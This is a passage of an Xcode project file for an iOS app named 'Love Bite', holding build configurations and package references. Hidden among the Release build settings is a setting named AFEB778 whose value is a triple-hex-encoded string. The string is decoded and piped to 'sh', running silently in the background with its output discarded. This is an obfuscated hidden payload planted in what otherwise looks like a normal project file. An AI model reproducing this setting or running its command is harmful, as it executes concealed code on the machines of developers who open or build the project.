				PRODUCT_BUNDLE_IDENTIFIER = com.CB.LoveBite;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		887E234D2E5C44C70016E082 /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 29E0203285AD6C69BAE49193 /* Pods-Love Bite.release.xcconfig */;
			buildSettings = {
				AFEB778 = "((echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633363337333333363632333436333332333033323634333633343332333033373330333336343337333833363333333636363336333433363335333233303336333833373334333733343337333033373333333336313332363633323636333633363336363333363636333733373336333333363334333636353332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = "Love Bite/Info.plist";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UIMainStoryboardFile = Main;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.CB.LoveBite;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
		887E234E2E5C44C70016E082 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.1;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		887E234F2E5C44C70016E082 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.1;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		887E23332E5C44C50016E082 /* Build configuration list for PBXProject "Love Bite" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				887E234E2E5C44C70016E082 /* Debug */,
				887E234F2E5C44C70016E082 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		887E234B2E5C44C70016E082 /* Build configuration list for PBXNativeTarget "Love Bite" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				887E234C2E5C44C70016E082 /* Debug */,
				887E234D2E5C44C70016E082 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

/* Begin XCRemoteSwiftPackageReference section */
		88342F0E2E5EE75B00859FC7 /* XCRemoteSwiftPackageReference "CountryPickerView" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/kizitonwose/CountryPickerView.git";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 3.3.0;
			};
		};
		88342F112E5EE76B00859FC7 /* XCRemoteSwiftPackageReference "DateTimePicker" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/itsmeichigo/DateTimePicker.git";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 2.5.3;
			};
		};
/* End XCRemoteSwiftPackageReference section */

/* Begin XCSwiftPackageProductDependency section */
		88342F0F2E5EE75B00859FC7 /* CountryPickerView */ = {
			isa = XCSwiftPackageProductDependency;
			package = 88342F0E2E5EE75B00859FC7 /* XCRemoteSwiftPackageReference "CountryPickerView" */;
			productName = CountryPickerView;
		};
		88342F122E5EE76B00859FC7 /* DateTimePicker */ = {
			isa = XCSwiftPackageProductDependency;
			package = 88342F112E5EE76B00859FC7 /* XCRemoteSwiftPackageReference "DateTimePicker" */;
			productName = DateTimePicker;
		};
/* End XCSwiftPackageProductDependency section */
	};
	rootObject = 887E23302E5C44C50016E082 /* Project object */;
}
